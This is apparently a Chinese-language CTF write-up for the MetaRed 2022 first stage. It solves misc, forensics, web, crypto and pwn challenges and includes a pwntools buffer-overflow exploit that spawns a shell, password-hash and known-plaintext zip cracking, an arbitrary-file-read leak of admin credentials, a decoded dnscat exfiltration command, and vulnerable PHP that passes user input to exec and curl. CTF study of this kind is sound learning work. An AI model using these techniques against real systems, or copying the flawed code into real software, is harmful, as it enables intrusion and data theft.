# MetaRed 1st stage
###### tags: `CTF`

## misc
### Welcome!
![](https://i.imgur.com/tFRTHxK.png)

discord -> misc -> 公告

flag{W3lcC00m3_t0_m3t4r3d_2022-CERTUNLP}

### Manuscrito misterioso
![](https://i.imgur.com/FLCx8tf.png)

圖片如下
![](https://i.imgur.com/RfGd4GY.jpg)

透過 google lans 找到一個叫做 [Voynich manuscript](https://en.wikipedia.org/wiki/Voynich_manuscript) 的東西，並找到一張對照表

![](https://i.imgur.com/1xPIS7d.png)

手動翻譯後如下
```
roses are red violets are blue

Sugar is sveet
And so the flag is

flagmaybeitvasajoke
```

flagmaybeitvasajoke

### Shared Spreadsheet
![](https://i.imgur.com/He4zggu.png)

打開連結後，發現是一些奇怪的東西

![](https://i.imgur.com/huIBkTR.png)

嘗試找 flag 之類的找不到，所以想說用建立副本來嘗試做一些試驗，然後發現裡面有 app script 的東東

![](https://i.imgur.com/hbF5gfm.png)

打開後，發現似乎是 flag 相關的東西，但不熟 apps script 的東西所以不太確定 newblob 會做甚麼事

![](https://i.imgur.com/wYAzqhp.png)

嘗試自己建 script，然後將輸出改成 console，就拿到 flag 了

![](https://i.imgur.com/iu0SuNd.png)

flag{70b4790fdfa181573cbbb481de1679d4041d35094e877178bb}

## prog
### Calculator
![](https://i.imgur.com/erbuldq.png)

總之就是要做一台計算機，輸入為一些字串及一行算式然後要算出來

腳本如下，由於在題目中沒有說明次數的關係，所以有使用 try catch 處理相關邏輯:
```python=
from pwn import *
context.log_level = "debug"

conn = remote("calculator.ctf.cert.unlp.edu.ar", 15002)

while True:
    try:
        conn.recvuntil(b"!:\n")
        question = conn.recvline().strip()
        conn.sendline(str(eval(question)).encode())
    except:
        break

conn.interactive()
```

flag{Programming_basics}

## forensics
### My secret tunnel
![](https://i.imgur.com/po7wF4t.png)

打開後，發現有兩條奇怪的 dns response

![](https://i.imgur.com/WXSKgy2.png)

name 為以下這兩個
```
dnscat.50b3015a5405d288d363617420666c61672e747874207c206261736536340a
dnscat.9152015a5488d305e85a6d78685a337445626c4e6664485675626a4d7a4d.3278734d5446755a32646e66516f3d0a
```

第一條用 hex to ascii 解出為以下字樣，似乎是在印 flag 並使用 base64 做 encode
```
P³.ZT.Ò.Ócat flag.txt | base64
```

而第二條解出的字樣如下:
```
.R.ZT.Ó.èZmxhZ3tEblNfdHVubjMzM2xsMTFuZ2dnfQo=
```

根據第一條的指令，去掉前面的一些奇怪字樣後使用 base64 做 decode，得出 flag
```
flag{DnS_tunn333ll11nggg}
```

flag{DnS_tunn333ll11nggg}

### Professional zip cracker
![](https://i.imgur.com/OE8ACSe.png)

快樂拆 zip 時間

第一關的 challenge.zip，使用 zip2john + john 搭配 rockyou.txt 找出密碼為 `puck02111987`

```bash=
zip2john challenge.zip > zip.hash
john --wordlist=rockyou.txt zip.hash
```

拆出來後，獲得 alittlemore.zip，一樣嘗試用 john 來解，但發現 rockyou 解不出來，但是用內建預設的可以解，得到密碼 `gz`

```bash=
zip2john alittlemore.zip > zip.hash
john zip.hash
```

然後收到了 flag.zip，但嘗試用 john 解但一直解不出來，後來觀察裡面檔案發現有奇怪的 `pkzip.ps.gz`，嘗試搜尋後找到了 [pkcrack](https://github.com/truongkma/ctf-tools/tree/master/pkcrack-1.2.2/doc) 工具

根據上面的文件安裝好了之後，建立一個叫 PK 的資料夾並將裡面提供的 `pkzip.ps.gz` 放入並整份包成一個 zip 作為明文壓縮檔，然後輸入以下指令讓他進行破解

```bash=
./pkcrack-1.2.2/src/pkcrack -C ~/Desktop/temp/flag.zip -c KP/pkzip.ps.gz -P ~/Desktop/temp/pkzip.zip -p KP/pkzip.ps.gz -d ~/Desktop/solve.zip
```

破解後的 zip 為 Desktop/solve.zip，flag 也在其中

flag{YouU_4r3_Th3_R34L_z1p_Cr444ck333r!!}

## web
### Basics
![](https://i.imgur.com/WYwvON5.png)

連進去後，發現只有一個 nothing
![](https://i.imgur.com/WyfhpMB.png)

嘗試看看 robots.txt，發現有奇怪的東東
![](https://i.imgur.com/YrGZFKH.png)

但連上後發現有 nothing here 的字樣
![](https://i.imgur.com/ILeB639.png)

既然 nothing here，那就找找看其他地方，發現藏在 response header
![](https://i.imgur.com/Sg1Uhjq.png)

flag{Header_HTTP_Rulessss}

### My super App
![](https://i.imgur.com/Ni1AmCd.png)

其實這題是其他 ctf 偷來的，上網搜尋一下後發現是今年 balsn ctf 的 `my first app` 題
![](https://i.imgur.com/gtHWbV3.png)

別人的 writeup: https://ctftime.org/writeup/35288

flag 藏在 client 的 index-5ad9564f1fd55ab7.js 中

![](https://i.imgur.com/ByroVIS.png)

flag{fr0nT_4nd_b4cK_1_h43rT}

### Not intuitive
![](https://i.imgur.com/NIM48Bm.png)

進入頁面後，發現裡面什麼都沒有

嘗試各種手段找找，發現在使用 OPTIONS 的 HTTP method 有發現奇怪的method 及 cookie

```bash=
curl -X OPTIONS -v https://notintuitive.ctf.cert.unlp.edu.ar/

< HTTP/1.1 200 OK
< server: Werkzeug/2.2.2 Python/3.9.7
< date: Mon, 26 Sep 2022 17:42:14 GMT
< content-type: text/html; charset=utf-8
< content-length: 0
< allow: HEAD, OPTIONS, GET, ETZDRE
< vary: Cookie
< set-cookie: session=eyJjb3NvIjoiRVRaRFJFIn0.YzHkdg.6ugbHSXy6gdDLR3_owK-Cr-xi7c; HttpOnly; Path=/
<
* Connection #0 to host notintuitive.ctf.cert.unlp.edu.ar left intact
```

嘗試使用這個 method 並帶上 cookie，發現就拿到 flag 了

```bash=
curl -X ETZDRE -v https://notintuitive.ctf.cert.unlp.edu.ar/ --cookie "session=eyJjb3NvIjoiRVRaRF
JFIn0.YzHkdg.6ugbHSXy6gdDLR3_owK-Cr-xi7c"

< HTTP/1.1 200 OK
< server: Werkzeug/2.2.2 Python/3.9.7
< date: Mon, 26 Sep 2022 17:42:47 GMT
< content-type: text/html; charset=utf-8
< content-length: 17
< vary: Cookie
<
* Connection #0 to host notintuitive.ctf.cert.unlp.edu.ar left intact
flag{An0therFl4g}
```

flag{An0therFl4g}

### (?) Go tigers!

進入的頁面的 Image Viewer 有任意檔案讀取漏洞

index.php
```php=
<?php
ini_set('display_errors', 'on');

class TigerClass {
    public function superSafeWAF($sql) {
        $pdo = new SQLite3('../tiger.db', SQLITE3_OPEN_READONLY);
        $safesql = implode (['select',  'union', 'order', 'by', 'from', 'group', 'insert'], '|');
        $sql = preg_replace ('/' . $safesql . '/i', '', $sql);
        $query = 'SELECT id, user FROM tigers WHERE id=' . $sql . ' LIMIT 1';
        $tigers = $pdo->query($query);
        $sol = $tigers->fetchArray(SQLITE3_ASSOC);
        if ($sol) {
            return $sol;
        }
        return false;
        }
    }

if (isset($_POST['tiger_id']) && isset($_POST['submit'])) {
    $tiger = new TigerClass ();
    $tigerAccounts = $tiger->superSafeWAF($_POST['tiger_id']);

}

if (isset($_POST['name']) && isset($_POST['submit'])) {
        //if(strpos($_POST['name'], "/") !== false){
	//	die("You can't hackme hehe");
	//}
	$_POST['name'] = strtolower($_POST['name']);
	echo file_get_contents($_POST['name']);
	die();
}

?>
```

可看到 tiger.db，使用 sqlite 的 .dump 可看到內容
```sql=
PRAGMA foreign_keys=OFF;
BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "tigers" (
        `id`    INTEGER,
        `user`  TEXT,
        `pass`  TEXT
);
INSERT INTO tigers VALUES(1,'admin','This_password_is_very_safe!');
INSERT INTO tigers VALUES(2,'John','Udontneedthis');
COMMIT;
```

通靈出有 login.php 和 admin.php，login 沒有用，admin 內容如下
```php=
<?php
ini_set('display_errors', 'on');
require_once 'hidden/data.php';

if (isset($_POST['submit']) && isset($_POST['username']) && isset($_POST['password'])) {
	if ( $_POST['username'] === $username && $_POST['password'] === $password) {
		$_SESSION['auth'] = "1";
		session_write_close();
	}
}

?>

<center><h2>Tiger Administrator Panel</h1><br>
<p>This is your admin panel</p><br>
<h4>Post Check</h4>
    <?php

    function str_contains($haystack, $needle) {
        return $needle !== '' && mb_strpos($haystack, $needle) !== false;
    }
    $not_protocol_smuggling = !str_contains(strtolower($_POST['post_url']),"file");

    if (isset($_SESSION['auth']) && isset($_POST['post_check']) && $not_protocol_smuggling) { exec(escapeshellcmd("timeout 5 curl " . escapeshellarg($_POST['post_url']) . " --output -"), $out); echo "<pre>"; print_r($out); echo "</pre>"; } ?>
</div>
<br>
<!--Acordarse de Fixear el BD user juanperez  -->
<h4>DB Status Check</h4>
    <?php if (isset($_SESSION['auth']) && isset($_POST['db_check'])) { exec('timeout 2 nc -z mysqlsafedb.com 3306 ; if [ $? -eq 0 ] ; then echo "Online"; else echo "Offline"; fi', $out); echo "<pre>"; print_r($out); echo "</pre>"; } ?>
<br>
```

可使用上一接段的 `admin/This_password_is_very_safe!` 登入

在中間的 post check 可輸入 `mysqlsafedb.com:3306`，並能獲得以下資訊
```
Array
(
    [0] => J
    [1] => 5.7.39�Afo-S3i����h~x.8Pzmysql_native_password!��#08S01Got packets out of order
)
```

推測遠端 mysql 的帳號是 `juanperez/mysql_native_password!`，只是目前需要繞過 escapeshellarg 和 escapeshellcmd 才能執行指令

## crypto
### Omelette du fromage Cipher
![](https://i.imgur.com/Dc8YPlO.png)

通靈出是 vigenere cipher

丟分析器，看到一個最合理的，猜測是 flag

![](https://i.imgur.com/DVFaMzd.png)

flag{V1g3ner3_2_34sy_maan}

### Launch time :)
![](https://i.imgur.com/3x8fypW.png)

將題目的那些 A 和 B 丟進 decode.fr 進行分析，發現是一個叫 bacon cipher 的東西

![](https://i.imgur.com/lvZYxaP.png)

解出來的 4 個可能的句子中，看起來最像句子的是第一句的 `DONDEESTAMIHAMBURGUESA`

![](https://i.imgur.com/2bmHe2f.png)

根據題目意思進行小寫，用 google translator 翻譯出的意思是`我的漢堡在哪裡`，看起來是一個很合理的句子

![](https://i.imgur.com/fDjrY8h.png)

經過嘗試及通靈後，使用 steghide 進行解密，密碼為上面的小寫字樣，會解出一個 `steganopayload768613.txt` 檔案，內容如下:
```
ZmxhZ3tCQGMwbl9zdXAzcl8zNHN5X215X2ZyMTNuZH0KCg==
```

看起來一臉 base64 樣，直接進行解碼，出來的就是 flag

flag{B@c0n_sup3r_34sy_my_fr13nd}

### Filename
![](https://i.imgur.com/fCiQXui.png)

從檔名可以看到，原本的圖片應該是一個 png 檔案，但是有經過 xor 加密過

從檔案的 signature 可以看到，應該是整個檔案都被加密而非加密其中一個區塊
```bash=
xxd flag.png.xor | head -n 1

00000000: de63 2224 3d67 7f2b 5733 6c6e 7925 2173  .c"$=g.+W3lny%!s
```

由於 png 檔案的前 16 bytes 是固定且已知的內容，在已知明文及密文的情況下可以直接 xor 得出金鑰

```
cipher (hex): de 63 22 24 3d 67 7f 2b 57 33 6c 6e 79 25 21 73
plain (hex):  89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52

---
xor (ascii): W3lc0me!W3lc0me!
```

![](https://i.imgur.com/njyxibU.png)

已知金鑰為 `W3lc0me!`，可得出原始內容

![](https://i.imgur.com/3JpT8DP.png)

![](https://i.imgur.com/xNNVkNT.jpg)

flag{X0r1ng_my_Fr1113nndd!}

## pwn
### Warmup
![](https://i.imgur.com/5PMeRrg.png)

source code 如下:
```c=
int main()
{

  int var;
  int check = 0x10203040;
  char buf[40];

  fgets(buf,45,stdin);

  printf("\n[buf]: %s\n", buf);
  printf("[check] %p\n", check);

  if ((check != 0x10203040) && (check != 0xf4c3b00c))
    printf ("\nClooosse!\n");

  if (check == 0xf4c3b00c)
   {
     printf("Yeah!! You win!\n");
     setreuid(geteuid(), geteuid());
     system("/bin/bash");
     printf("Byee!\n");
   }
   return 0;
}
```

可以看到，輸入 buf 長度為 40 但可以輸入 45 個字元，因此可以覆蓋到其他變數，而根據 c 的 calling convention，變數會根據順序堆疊進 stack，因此可以覆蓋到 check，所以只要先隨便塞 40 個垃圾之後塞 0xf4c3b00c 即可獲得 shell

腳本如下:
```python=
from pwn import *
context.terminal = ["cmd.exe", "/c", "start", "bash.exe", "-c"]
context.log_level = "debug"
context.binary = "./reto"

conn = remote("warmup.ctf.cert.unlp.edu.ar", 15004)
#conn = process("./reto")

payload = b"A" * 40
payload += p32(0xf4c3b00c)
conn.send(payload)

conn.interactive()
```

flag 在當前目錄下的 flag 檔案

![](https://i.imgur.com/v59Difh.png)

flag{w3lc0m3_t0_pwN-2022!}

### Segundas marcas
![](https://i.imgur.com/QYIRPfU.png)

反正拿到 binary 就是反組譯就對了，看起來這是一個 flag shop 題目
![](https://i.imgur.com/Fx6yNW2.png)

檢視過後，發現有問題的地方是以下部分，由於 total_cost 皆為 signed int，所以當輸入的 number_flags 乘上 1000 超過 INT_MAX 後，total_cost 就會變成負數，所以 account_balance 減去一個負數即會變成超大的正數，所以就能購買選項 2 的 flag
![](https://i.imgur.com/VkLB8qg.png)

流程:
```
初始餘額為 1100
2->1 買 Flag segunda marca 3000000 個
餘額變成 1294968396
2->2 買 Flag genuina 1 個
出現 flag
```

flag{Fl4gSss_s3gunD4S_m4rC4s}